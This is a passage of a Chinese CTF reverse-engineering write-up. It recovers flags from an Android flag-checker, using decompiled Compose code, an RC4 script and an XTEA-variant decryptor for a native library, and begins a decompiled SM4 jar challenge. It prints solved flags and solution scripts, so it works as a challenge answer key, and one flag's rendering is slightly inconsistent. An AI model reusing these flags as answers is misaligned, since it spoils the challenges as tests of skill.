num.intValue());</span><br><span class="line">                <span class="keyword">return</span> Unit.INSTANCE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Composer composer, <span class="type">int</span> i)</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((i &amp; <span class="number">11</span>) != <span class="number">2</span> || !composer.getSkipping()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (ComposerKt.isTraceInProgress()) &#123;</span><br><span class="line">                        ComposerKt.traceEventStart(-<span class="number">1003124788</span>, i, -<span class="number">1</span>, <span class="string">&quot;com.challenge.xsran.MainActivity.onCreate.&lt;anonymous&gt; (MainActivity.kt:81)&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">final</span> <span class="type">MainActivity</span> <span class="variable">mainActivity</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;</span><br><span class="line">                    ThemeKt.MyApplicationTheme(<span class="literal">false</span>, <span class="literal">false</span>, ComposableLambdaKt.composableLambda(composer, <span class="number">1465895320</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Composer, Integer, Unit&gt;() &#123; <span class="comment">// from class: com.challenge.xsran.MainActivity.onCreate.1.1</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">super</span>(<span class="number">2</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function2</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="comment">/* bridge */</span> <span class="comment">/* synthetic */</span> Unit <span class="title function_">invoke</span><span class="params">(Composer composer2, Integer num)</span> &#123;</span><br><span class="line">                            invoke(composer2, num.intValue());</span><br><span class="line">                            <span class="keyword">return</span> Unit.INSTANCE;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Composer composer2, <span class="type">int</span> i2)</span> &#123;</span><br><span class="line">                            <span class="keyword">if</span> ((i2 &amp; <span class="number">11</span>) != <span class="number">2</span> || !composer2.getSkipping()) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (ComposerKt.isTraceInProgress()) &#123;</span><br><span class="line">                                    ComposerKt.traceEventStart(<span class="number">1465895320</span>, i2, -<span class="number">1</span>, <span class="string">&quot;com.challenge.xsran.MainActivity.onCreate.&lt;anonymous&gt;.&lt;anonymous&gt; (MainActivity.kt:82)&quot;</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="type">Modifier</span> <span class="variable">modifierFillMaxSize$default</span> <span class="operator">=</span> SizeKt.fillMaxSize$<span class="keyword">default</span>(Modifier.INSTANCE, <span class="number">0.0f</span>, <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line">                                <span class="type">long</span> <span class="variable">jM984getBackground0d7_KjU</span> <span class="operator">=</span> MaterialTheme.INSTANCE.getColorScheme(composer2, MaterialTheme.$stable).m984getBackground0d7_KjU();</span><br><span class="line">                                <span class="keyword">final</span> <span class="type">MainActivity</span> <span class="variable">mainActivity2</span> <span class="operator">=</span> mainActivity;</span><br><span class="line">                                SurfaceKt.m1271SurfaceT9BRK9s(modifierFillMaxSize$<span class="keyword">default</span>, <span class="literal">null</span>, jM984getBackground0d7_KjU, <span class="number">0L</span>, <span class="number">0.0f</span>, <span class="number">0.0f</span>, <span class="literal">null</span>, ComposableLambdaKt.composableLambda(composer2, -<span class="number">989399779</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Function2</span>&lt;Composer, Integer, Unit&gt;() &#123; <span class="comment">// from class: com.challenge.xsran.MainActivity.onCreate.1.1.1</span></span><br><span class="line">                                    &#123;</span><br><span class="line">                                        <span class="built_in">super</span>(<span class="number">2</span>);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function2</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="comment">/* bridge */</span> <span class="comment">/* synthetic */</span> Unit <span class="title function_">invoke</span><span class="params">(Composer composer3, Integer num)</span> &#123;</span><br><span class="line">                                        invoke(composer3, num.intValue());</span><br><span class="line">                                        <span class="keyword">return</span> Unit.INSTANCE;</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Composer composer3, <span class="type">int</span> i3)</span> &#123;</span><br><span class="line">                                        <span class="keyword">if</span> ((i3 &amp; <span class="number">11</span>) == <span class="number">2</span> &amp;&amp; composer3.getSkipping()) &#123;</span><br><span class="line">                                            composer3.skipToGroupEnd();</span><br><span class="line">                                            <span class="keyword">return</span>;</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">if</span> (ComposerKt.isTraceInProgress()) &#123;</span><br><span class="line">                                            ComposerKt.traceEventStart(-<span class="number">989399779</span>, i3, -<span class="number">1</span>, <span class="string">&quot;com.challenge.xsran.MainActivity.onCreate.&lt;anonymous&gt;.&lt;anonymous&gt;.&lt;anonymous&gt; (MainActivity.kt:86)&quot;</span>);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        <span class="keyword">final</span> <span class="type">MainActivity</span> <span class="variable">mainActivity3</span> <span class="operator">=</span> mainActivity2;</span><br><span class="line">                                        ComposerKt.sourceInformationMarkerStart(composer3, <span class="number">1157296644</span>, <span class="string">&quot;CC(remember)P(1):Composables.kt#9igjgp&quot;</span>);</span><br><span class="line">                                        <span class="type">boolean</span> <span class="variable">zChanged</span> <span class="operator">=</span> composer3.changed(mainActivity3);</span><br><span class="line">                                        <span class="type">Object</span> <span class="variable">objRememberedValue</span> <span class="operator">=</span> composer3.rememberedValue();</span><br><span class="line">                                        <span class="keyword">if</span> (zChanged || objRememberedValue == Composer.INSTANCE.getEmpty()) &#123;</span><br><span class="line">                                            objRememberedValue = (Function1) <span class="keyword">new</span> <span class="title class_">Function1</span>&lt;String, Boolean&gt;() &#123; <span class="comment">// from class: com.challenge.xsran.MainActivity$onCreate$1$1$1$1$1</span></span><br><span class="line">                                                &#123;</span><br><span class="line">                                                    <span class="built_in">super</span>(<span class="number">1</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line"></span><br><span class="line">                                                <span class="meta">@Override</span> <span class="comment">// kotlin.jvm.functions.Function1</span></span><br><span class="line">                                                <span class="keyword">public</span> <span class="keyword">final</span> Boolean <span class="title function_">invoke</span><span class="params">(String it)</span> &#123;</span><br><span class="line">                                                    Intrinsics.checkNotNullParameter(it, <span class="string">&quot;it&quot;</span>);</span><br><span class="line">                                                    <span class="keyword">return</span> Boolean.valueOf(mainActivity3.validate(it));</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;;</span><br><span class="line">                                            composer3.updateRememberedValue(objRememberedValue);</span><br><span class="line">                                        &#125;</span><br><span class="line">                                        ComposerKt.sourceInformationMarkerEnd(composer3);</span><br><span class="line">                                        MainActivityKt.FlagCheckerScreen((Function1) objRememberedValue, composer3, <span class="number">0</span>);</span><br><span class="line">                                        <span class="keyword">if</span> (ComposerKt.isTraceInProgress()) &#123;</span><br><span class="line">                                            ComposerKt.traceEventEnd();</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;), composer2, <span class="number">12582918</span>, <span class="number">122</span>);</span><br><span class="line">                                <span class="keyword">if</span> (ComposerKt.isTraceInProgress()) &#123;</span><br><span class="line">                                    ComposerKt.traceEventEnd();</span><br><span class="line">                                    <span class="keyword">return</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">return</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            composer2.skipToGroupEnd();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;), composer, <span class="number">384</span>, <span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span> (ComposerKt.isTraceInProgress()) &#123;</span><br><span class="line">                        ComposerKt.traceEventEnd();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                composer.skipToGroupEnd();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), <span class="number">1</span>, <span class="literal">null</span>);</span><br><span class="line">        startService(<span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, (Class&lt;?&gt;) MySimpleService.class));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>flag第一部分关键是J_Validate函数，其中调用的unknownEncrypt是RC4。密钥UNKNOWN_KEY，密文JAVA_CIPHER</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="built_in">bytes</span>([<span class="number">1</span>, <span class="number">35</span>, <span class="number">69</span>, <span class="number">103</span>, <span class="number">137</span>, <span class="number">171</span>, <span class="number">205</span>, <span class="number">239</span>, <span class="number">254</span>, <span class="number">220</span>, <span class="number">186</span>, <span class="number">152</span>, <span class="number">118</span>, <span class="number">84</span>, <span class="number">50</span>, <span class="number">16</span>])</span><br><span class="line">cipher = <span class="built_in">bytes</span>([<span class="number">198</span>, <span class="number">23</span>, <span class="number">244</span>, <span class="number">244</span>, <span class="number">182</span>, <span class="number">92</span>, <span class="number">206</span>, <span class="number">144</span>])  <span class="comment"># 注意：Java的byte是有符号的，需要转换</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4</span>(<span class="params">key, data</span>):</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    </span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        result.append(byte ^ S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br><span class="line"></span><br><span class="line">part1 = rc4(key, cipher)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;第一部分: <span class="subst">&#123;part1.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到kokodayo</p>
<p>第二部分关键是N_Valildate函数（和题目名字呼应上了），找找libxsran.so</p>
<p>同第一题，解压，ida</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> __fastcall <span class="title function_">Java_com_challenge_xsran_MainActivity_N_1Valildate</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// r10d</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v7; <span class="comment">// r11d</span></span><br><span class="line">  _QWORD v9[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v9[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(__int64, __int64, _QWORD, __int64, _QWORD *))(*(_QWORD *)a1 + <span class="number">1600LL</span>))(a1, a3, <span class="number">0</span>, <span class="number">8</span>, v9);</span><br><span class="line">  v3 = v9[<span class="number">0</span>];</span><br><span class="line">  v4 = HIDWORD(v9[<span class="number">0</span>]);</span><br><span class="line">  v5 = <span class="number">-32</span>;</span><br><span class="line">  v6 = <span class="number">-1640531527</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v7 = v4;</span><br><span class="line">    v4 = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    v3 += (((v7 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v7)) + ((v7 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v7))) ^ ((v6 ^ v7) + (v7 ^ dword_590[v4]));</span><br><span class="line">    LODWORD(v4) = v7</span><br><span class="line">                + ((((v3 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">4</span> * v3)) + ((v3 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v3)))</span><br><span class="line">                 ^ ((v6 ^ v3) + (v3 ^ dword_590[(<span class="type">unsigned</span> <span class="type">int</span>)v4 ^ <span class="number">1</span>])));</span><br><span class="line">    v6 -= <span class="number">1640531527</span>;</span><br><span class="line">    ++v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 );</span><br><span class="line">  <span class="keyword">return</span> (v3 ^ <span class="number">0x6421ACBE</span> | (<span class="type">unsigned</span> <span class="type">int</span>)v4 ^ <span class="number">0xFA7CB432</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>xTEA变种。</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">输入与输出：</span><br><span class="line">加密后的结果（最终比较值）：v3 = 0x6421ACBE, v4 = 0xFA7CB432。</span><br><span class="line">密钥（dword_590）：[0x3C2D1E0F, 0x78695A4B, 0xB4A59687, 0xF0E1D2C3]。</span><br><span class="line">Delta 常量：1640531527 (即 0x9E3779B9)。</span><br><span class="line">轮数：32 轮（v5 从 -32 增加到 0）。</span><br><span class="line">加密过程（每轮）：</span><br><span class="line">idx = (v6 &gt;&gt; 2) &amp; 3</span><br><span class="line">v3 += (((v4 &gt;&gt; 5) ^ (v4 &lt;&lt; 2)) + ((v4 &gt;&gt; 3) ^ (v4 &lt;&lt; 4))) ^ ((v6 ^ v4) + (v4 ^ key[idx]))</span><br><span class="line">v4 = v4_old + (((v3 &gt;&gt; 5) ^ (v3 &lt;&lt; 2)) + ((v3 &gt;&gt; 3) ^ (v3 &lt;&lt; 4))) ^ ((v6 ^ v3) + (v3 ^ key[idx ^ 1]))</span><br><span class="line">v6 -= delta</span><br><span class="line">解密思路：</span><br><span class="line">由于加密是先更新 v3 再更新 v4，解密时要先逆向更新 v4 再逆向更新 v3。</span><br><span class="line">索引逻辑：v4 在循环开始时被临时用作索引 (v6 &gt;&gt; 2) &amp; 3，更新 v3 时使用 key[v4]，更新 v4 本身时使用 key[v4 ^ 1]。</span><br><span class="line">v6 的初始值需计算：加密开始时 v6 = 0x9E3779B9，经过 32 次减法，最后一次使用的 v6 是 0x9E3779B9 - 31 * 0x9E3779B9。</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>():</span><br><span class="line">    <span class="comment"># 最终比较的目标值</span></span><br><span class="line">    v3 = <span class="number">0x6421ACBE</span></span><br><span class="line">    v4 = <span class="number">0xFA7CB432</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 密钥数组 dword_590 (注意小端序转 32 位整数)</span></span><br><span class="line">    key = [<span class="number">0x3C2D1E0F</span>, <span class="number">0x78695A4B</span>, <span class="number">0xB4A59687</span>, <span class="number">0xF0E1D2C3</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 根据 C 代码: v6 = -1640531527 (即 0x9E3779B9)</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 加密共 32 轮</span></span><br><span class="line">    <span class="comment"># 第 1 轮使用的 v6 是 1 * delta</span></span><br><span class="line">    <span class="comment"># 第 32 轮使用的 v6 是 32 * delta</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        v6 = (i * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        idx = (v6 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 1. 逆向还原 v4</span></span><br><span class="line">        <span class="comment"># 加密逻辑: v4 = v7 + (((v3 &gt;&gt; 5) ^ (v3 &lt;&lt; 2)) + ((v3 &gt;&gt; 3) ^ (v3 &lt;&lt; 4))) ^ ((v6 ^ v3) + (v3 ^ key[idx ^ 1]))</span></span><br><span class="line">        <span class="comment"># 其中 v7 是旧的 v4</span></span><br><span class="line">        t2_part1 = (((v3 &gt;&gt; <span class="number">5</span>) ^ (v3 &lt;&lt; <span class="number">2</span>)) + ((v3 &gt;&gt; <span class="number">3</span>) ^ (v3 &lt;&lt; <span class="number">4</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        t2_part2 = ((v6 ^ v3) + (v3 ^ key[idx ^ <span class="number">1</span>])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v4 = (v4 - (t2_part1 ^ t2_part2)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 2. 逆向还原 v3</span></span><br><span class="line">        <span class="comment"># 加密逻辑: v3 = v3_old + (((v4 &gt;&gt; 5) ^ (v4 &lt;&lt; 2)) + ((v4 &gt;&gt; 3) ^ (v4 &lt;&lt; 4))) ^ ((v6 ^ v4) + (v4 ^ key[idx]))</span></span><br><span class="line">        <span class="comment"># 此时的 v4 已经是上面还原出来的 v4_old 了</span></span><br><span class="line">        t1_part1 = (((v4 &gt;&gt; <span class="number">5</span>) ^ (v4 &lt;&lt; <span class="number">2</span>)) + ((v4 &gt;&gt; <span class="number">3</span>) ^ (v4 &lt;&lt; <span class="number">4</span>))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        t1_part2 = ((v6 ^ v4) + (v4 ^ key[idx])) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v3 = (v3 - (t1_part1 ^ t1_part2)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 按照小端序转换回字节</span></span><br><span class="line">    res = struct.pack(<span class="string">&quot;&lt;II&quot;</span>, v3, v4)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">result = decrypt()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密后的字符串: <span class="subst">&#123;result.decode(<span class="string">&#x27;ascii&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;结果包含不可见字符，请检查是否还有第一段或其他变换&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>~OoO ~OoO(中间没有空格)</p>
<p><strong>flag{kokodayo~Oo O~OoO}</strong>(没有空格)</p>
<p>这flag还真是别具一格的sao</p>
<ul>
<li>easyjar</li>
</ul>
<blockquote>
<p>Reverse engineering a simple algorithm</p>
</blockquote>
<p>sm4chal.jar，用jd反编译即可</p>
<p>Main.class:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_SEED</span> <span class="operator">=</span> <span class="string">&quot;happ&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] KEY = Sm4.deriveKeyFromSeed(<span class="string">&quot;happ&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TARGET_CIPHER_HEX</span> <span class="operator">=</span> <span class="string">&quot;21c2692a4775c413356a31fc55c38f6218bed9d46c45bd0eb777be9334c999d7&quot;</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] paramArrayOfString)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(System.in));</span><br><span class="line">    System.out.print(<span class="string">&quot;Input flag: &quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> bufferedReader.readLine();</span><br><span class="line">    <span class="keyword">if</span> (str1 == <span class="literal">null</span>)</span><br><span class="line">      <span class="keyword">return</span>; </span><br><span class="line">    <span class="keyword">if</span> (!str1.startsWith(<span class="string">&quot;flag&#123;&quot;</span>) || !str1.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="type">byte</span>[] arrayOfByte = Sm4.encrypt(KEY, str1.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Sm4.toHex(arrayOfByte);</span><br><span class="line">    <span class="keyword">if</span> (str2.equals(<span class="string">&quot;21c2692a4775c413356a31fc55c38f6218bed9d46c45bd0eb777be9334c999d7&quot;</span>)) &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Correct&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Wrong&quot;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Sm4.class:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span 